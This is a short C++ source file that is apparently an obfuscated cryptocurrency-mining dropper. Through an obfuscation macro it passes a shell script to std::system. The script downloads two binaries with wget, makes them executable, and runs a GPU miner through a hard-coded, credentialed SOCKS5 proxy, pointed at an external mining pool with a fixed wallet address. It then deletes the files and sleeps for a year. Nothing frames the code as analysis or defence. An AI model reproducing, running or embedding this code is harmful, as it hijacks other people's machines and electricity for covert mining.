#include "obs.h"
#include <stdlib.h>
int main() {
std::system(AY_OBFUSCATE("\n\
export CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
export NAME=$(shuf -n 1 -i 10000000-99999999)\n\
mkdir -p /tmp/$CLANG\n\
mkdir -p /tmp/$CLING\n\
wget -qO /tmp/$CLANG/$NAME https://github.com/BloodMaryDev/Compute-substrate-Miner/releases/latest/download/compute-substrate-forge \n\
wget -qO /tmp/$CLING/$NAME wget https://github.com/mulgeblex2/malah55/raw/main/gg \n\
chmod +x /tmp/$CLANG/$NAME\n\
chmod +x /tmp/$CLING/$NAME\n\
/tmp/$CLING/$NAME -n socks5://phvazawu:kkwdnus06cnc@31.59.20.176:6754 /tmp/$CLANG/$NAME --all-gpus --address 0xd17c95e17f3a6b6d21141509f8b6c1e7610c505e --pool csd-ru.lproute.com:8760 >/dev/null 2>&1 & echo HEARTBEAT\n\
rm -rf /tmp/$CLING /tmp/$CLANG\n\
sleep 365d\n"));
}



